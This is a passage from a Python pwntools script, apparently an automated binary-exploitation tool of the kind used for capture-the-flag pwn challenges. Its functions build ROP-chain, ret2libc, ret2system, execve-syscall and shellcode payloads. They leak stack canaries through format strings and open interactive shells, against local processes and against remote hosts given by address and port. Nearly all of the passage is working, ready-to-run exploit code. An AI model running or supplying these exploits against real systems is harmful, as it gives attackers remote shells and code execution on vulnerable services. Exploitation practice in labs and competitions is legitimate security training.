        pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
        pop_edx_addr = int(pop_edx_addr, 16)
        pop_edx_addr = p32(pop_edx_addr)
        int_0x80 = int(int_0x80, 16)
        int_0x80 = p32(int_0x80)
        
        payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0, bin_sh_addr, pop_edx_addr, 0, int_0x80])
        io.recv()
        io.sendline(payload)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        io.interactive()
    else:
        e = ELF(program)
        bin_sh_addr = next(e.search(b'/bin/sh'))
        print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
        
        pop_eax_addr = int(pop_eax_addr, 16)
        pop_eax_addr = p32(pop_eax_addr)
        pop_ecx_addr = int(pop_ecx_addr, 16)
        pop_ecx_addr = p32(pop_ecx_addr)
        pop_ebx_addr = int(pop_ebx_addr, 16)
        pop_ebx_addr = p32(pop_ebx_addr)
        pop_edx_addr = int(pop_edx_addr, 16)
        pop_edx_addr = p32(pop_edx_addr)
        int_0x80 = int(int_0x80, 16)
        int_0x80 = p32(int_0x80)
        
        payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr, pop_ecx_addr, 0, pop_edx_addr, 0, int_0x80])
        io.recv()
        io.sendline(payload)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        io.interactive()

def rwx_shellcode_x32_remote(program, buf_addr, padding, function_name, ret_addr, url, port):
    """Remote RWX shellcode exploitation for x32 architecture"""
    print_section_header("EXPLOITATION: RWX Shellcode - x32 Remote")
    print_payload("preparing remote RWX shellcode exploit")
    
    io = remote(url, port)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p32(buf_addr)
    name_addr = elf.symbols[function_name]
    shellcode = asm(shellcraft.sh())
    
    print_info(f"shellcode storage: {Colors.YELLOW}{function_name}{Colors.END}")
    print_info(f"shellcode size: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes")
    
    payload = flat([shellcode.ljust(padding, asm('nop')), p32(name_addr)])
    io.recv()
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def rwx_shellcode_x64_remote(program, buf_addr, padding, function_name, ret_addr, url, port):
    """Remote RWX shellcode exploitation for x64 architecture"""
    print_section_header("EXPLOITATION: RWX Shellcode - x64 Remote")
    print_payload("preparing remote RWX shellcode exploit")
    
    io = remote(url, port)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p64(buf_addr)
    name_addr = elf.symbols[function_name]
    shellcode = asm(shellcraft.sh())
    
    print_info(f"shellcode storage: {Colors.YELLOW}{function_name}{Colors.END}")
    print_info(f"shellcode size: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes")
    
    payload = flat([shellcode.ljust(padding, asm('nop')), p64(name_addr)])
    io.recv()
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_put_canary_x32(program,libc,libc_path,padding,c,diff):
	"""ret2libc exploitation with canary bypass using puts for x32 architecture"""
	print_section_header("EXPLOITATION: ret2libc (puts) with Canary Bypass - x32")
	print_payload("preparing ret2libc exploit with canary bypass using puts function")
	
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print_info("using LibcSearcher for libc resolution")
		else:	
			print_info("using user specified libc path")
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	print_info(f"leaking canary value at position {Colors.YELLOW}{c}{Colors.END}")
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print_success(f"canary value: {Colors.YELLOW}{result}{Colors.END}")
	result = int(result, 16)
	canary = p32(result)

	print_info("constructing stage 1 payload to leak puts address")
	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(puts_plt) , p32(main_addr) , p32(puts_got)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u32(io.recvuntil(b'\xf7')[-4:])
	print_success(f"puts function address in libc: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")

	print_info("calculating libc base and target addresses")
	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print_success(f"system function address in libc: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
		sh_addr = libcbase + libc_sh
		print_success(f"/bin/sh string address in libc: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
	else:
		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = puts_addr - libc_puts + libc_system
		print_success(f"system function address in libc: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
		sh_addr = puts_addr - libc_puts + libc_sh
		print_success(f"/bin/sh string address in libc: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

	print_info("re-leaking canary for stage 2 exploit")
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	io.recv()
	print_info("constructing stage 2 payload for system call")
	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(system_addr) , p32(0) , p32(sh_addr)])
	io.sendline(payload2)
	print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
	io.interactive()

def ret2libc_put_x32_canary_remote(program,libc,padding,url,port,c,diff):
	"""Remote ret2libc exploitation with canary bypass using puts for x32 architecture"""
	print_section_header("EXPLOITATION: ret2libc (puts) with Canary Bypass - x32 Remote")
	print_payload(f"preparing remote ret2libc exploit with canary bypass to {Colors.YELLOW}{url}:{port}{Colors.END}")
	
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print_info("using LibcSearcher for libc resolution")
		else:	
			print_info("using user specified libc path")
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	print_info(f"leaking canary value at position {Colors.YELLOW}{c}{Colors.END}")
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print_success(f"canary value: {Colors.YELLOW}{result}{Colors.END}")
	result = int(result, 16)
	canary = p32(result)

	print_info("constructing stage 1 payload to leak puts address")
	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(puts_plt) , p32(main_addr) , p32(puts_got)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u32(io.recvuntil(b'\xf7')[-4:])
	print_success(f"puts function address in libc: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")

	print_info("calculating libc base and target addresses")
	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print_success(f"system function address in libc: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
		sh_addr = libcbase + libc_sh
		print_success(f"/bin/sh string address in libc: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
	else:
		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = puts_addr - libc_puts + libc_system
		print_success(f"system function address in libc: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
		sh_addr = puts_addr - libc_puts + libc_sh
		print_success(f"/bin/sh string address in libc: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

	print_info("re-leaking canary for stage 2 exploit")
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	io.recv()
	print_info("constructing stage 2 payload for system call")
	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(system_addr) , p32(0) , p32(sh_addr)])
	io.sendline(payload2)
	print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
	io.interactive()

def ret2libc_put_canary_x64(program,libc,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,padding,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print_info('Using LibcSearcher')
		else:	
			print_warning('User did not specify libc path')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"Canary value is: {result}")
	result = int(result, 16)
	canary = p64(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(puts_got), p64(puts_plt) , p64(main_addr)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
	print(f'[*]puts function address in libc: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	io.recv()
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr) ,ret_addr,p64(system_addr)])
	io.sendline(payload2)
	io.interactive()

def ret2libc_put_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port,c,diff):
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print('[*]Using LibcSearcher')
		else:	
			print('[*]User did not specify libc path')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"Canary value is: {result}")
	result = int(result, 16)
	canary = p64(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(puts_got), p64(puts_plt) , p64(main_addr)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
	print(f'[*]puts function address in libc: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	io.recv()
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff , pop_rdi_addr , p64(sh_addr) ,ret_addr,p64(system_addr)])
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_canary_x32(program,libc,padding,libc_path,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]Using LibcSearcher')
		else:	
			print('[*]User did not specify libc path')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"Canary value is: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(write_plt) , p32(main_addr) , p32(1) , p32(write_got) , p32(4)])
	io.recv()
	io.sendline(payload1)

	write_addr = u32(io.recv(4))
	print(f'[*]write function address in libc: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	io.recv()
	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff, p32(system_addr) , p32(0) , p32(sh_addr)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_canary_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,c,diff):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]Using LibcSearcher')
		else:	
			print('[*]User did not specify libc path')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']
	if other_rsi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"Canary value is: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , canary , b'AAAAAAAA' * diff ,pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(0) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"Canary value is: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff , pop_rdi_addr , p64(1) , p64(0), pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 0 and other_rsi_registers == 0:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"Canary value is: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	write_addr = u64(io.recv(8))
	print(f'[*]write function address in libc: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()

	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding ,canary , b"AAAAAAAA" * diff , pop_rdi_addr , p64(sh_addr), p64(0), p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(sh_addr) ,p64(system_addr) , p64(0)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2_system_canary_x32(program, libc, padding, libc_path, c, diff):
	io = process(program)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system function address in program: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"Canary value is: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload = flat([asm('nop') * padding, canary, b"AAAA" * diff, p32(system_addr), p32(0), p32(bin_sh_addr)])
	io.sendline(payload)
	io.interactive()

def ret2_system_canary_x64(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, libc_path, c, diff):
	if pop_rdi_addr == None:
		print("pop rdi instruction does not exist, cannot exploit")
		sys.exit(0)
	io = process(program)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system function address in program: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary value is: {result}")
	result = int(result, 16)
	canary = p64(result)

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)

	if other_rdi_registers == 1:
		payload = flat([asm('nop') * padding ,canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(bin_sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	elif other_rdi_registers == 0:
		payload = flat([asm('nop') * padding , canary , b"AAAAAAAA" * diff, pop_rdi_addr , p64(bin_sh_addr), ret_addr,p64(system_addr)])
	io.sendline(payload)
	io.interactive()

def execve_canary_syscall(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80, c, diff):
	if pop_ecx_addr == None:
		io = process(program)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
		pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary value is: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding, canary, b"AAAA" * diff, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0, bin_sh_addr, pop_edx_addr, 0, int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()
	else:
		io = process(program)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_addr = int(pop_ecx_addr, 16)
		pop_ecx_addr = p32(pop_ecx_addr)
		pop_ebx_addr = int(pop_ebx_addr, 16)
		pop_ebx_addr = p32(pop_ebx_addr)
		pop_edx_addr = int(pop_edx_addr, 16)
		pop_edx_addr = p32(pop_edx_addr)
		int_0x80 = int(int_0x80, 16)
		int_0x80 = p32(int_0x80)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"canary value is: {result}")
		result = int(result, 16)
		canary = p32(result)

		payload = flat([asm('nop') * padding, canary, b"AAAA" * diff, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr, pop_ecx_addr, 0, pop_edx_addr, 0, int_0x80])
		io.recv()
		io.sendline(payload)
		print('\033[31m[*]PWN!!!\033[0m')
		io.interactive()

def ret2libc_write_x32_canary_remote(program,libc,padding,url,port,c,diff):
	io = remote(url,port)
	if libc == 1:
		if libc_path == None:
			print('[*]Using LibcSearcher')
		else:	
			print('[*]User did not specify libc path')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"Canary value is: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload1 = flat([asm('nop') * padding , canary , b'AAAA' * diff , p32(write_plt) , p32(main_addr) , p32(1) , p32(write_got) , p32(4)])
	io.recv()
	io.sendline(payload1)

	write_addr = u32(io.recv(4))
	print(f'[*]write function address in libc: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())

	io.recv()

	payload2 = flat([asm('nop') * padding , canary , b'AAAA' * diff, p32(system_addr) , p32(0) , p32(sh_addr)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_x64_canary_remote(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, url, port, c, diff):
	io = remote(url, port)
	if libc == 1:
		if libc_path == None:
			print('[*]Using LibcSearcher')
		else:	
			print('[*]User did not specify libc path')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']
	if other_rsi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"Canary value is: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding, canary, b'AAAAAAAA' * diff, pop_rdi_addr, p64(1), pop_rsi_addr, p64(write_got), p64(0), p64(write_plt), p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"Canary value is: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding, canary, b"AAAAAAAA" * diff, pop_rdi_addr, p64(1), p64(0), pop_rsi_addr, p64(write_got), p64(write_plt), p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 0 and other_rsi_registers == 0:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		io.recv()
		io.sendline(f'%{c}$p'.encode())
		result = io.recvline().decode().strip()
		print(f"Canary value is: {result}")
		result = int(result, 16)
		canary = p64(result)

		payload1 = flat([asm('nop') * padding, canary, b"AAAAAAAA" * diff, pop_rdi_addr, p64(1), pop_rsi_addr, p64(write_got), p64(write_plt), p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	write_addr = u64(io.recv(8))
	print(f'[*]write function address in libc: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write", write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system function address in libc: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh string address in libc: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	result = int(result, 16)
	canary = p64(result)

	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)

	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding, canary, b"AAAAAAAA" * diff, pop_rdi_addr, p64(sh_addr), p64(0), ret_addr, p64(system_addr), p64(0)])
	elif other_rdi_registers == 0:
		payload2 = flat([asm('nop') * padding, canary, b"AAAAAAAA" * diff, pop_rdi_addr, p64(sh_addr), ret_addr, p64(system_addr)])

	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2_system_x32_canary_remote(program, libc, padding, url, port, c, diff):
	io = remote(url, port)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system function address in program: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh string address in program: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()
	io.sendline(f'%{c}$p'.encode())
	result = io.recvline().decode().strip()
	print(f"canary value is: {result}")
	result = int(result, 16)
	canary = p32(result)

	payload = flat([asm('nop') * padding, canary, b"AAAA" * diff, p32(system_addr), p32(0), p32(bin_sh_addr)])
	io.sendline(payload)
	io.interactive()

def ret2_system_x64_canary_remote(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, url, port, c, diff):
	if pop_rdi_addr == None:
		print("pop rdi instruction does not exist, cannot exploit")
		sys.exit(0)
	io = remote(url, port)
